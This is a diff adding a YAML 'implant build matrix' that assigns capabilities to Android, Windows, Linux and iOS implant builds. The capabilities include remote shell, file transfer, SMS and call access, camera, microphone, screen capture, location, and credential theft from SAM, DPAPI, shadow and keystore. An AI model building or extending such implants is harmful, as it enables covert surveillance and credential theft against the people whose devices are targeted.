@@ -1,0 +1,15 @@
+# Implant build matrix. hello caps are clamped to the build row (plan 77).
+- {build: android-min,
+   caps: [agent.rpc, shell, file.get, file.list, proc.list, pkg.list]}
+- {build: android-full,
+   caps: [agent.rpc, shell, file.get, file.put, file.list, proc.list, pkg.list,
+          comms.sms, comms.calls, comms.contacts, pos.location, radio.wifi,
+          screen.capture, camera, mic, creds.keystore, os.cron]}
+- {build: windows-svc,
+   caps: [agent.rpc, shell, file.get, file.list, proc.list, os.registry,
+          creds.sam, creds.dpapi]}
+- {build: linux-svc,
+   caps: [agent.rpc, shell, file.get, file.put, file.list, proc.list,
+          os.systemd, os.cron, creds.shadow]}
+- {build: ios-mdm,
+   caps: [agent.rpc, pos.location, screen.capture]}
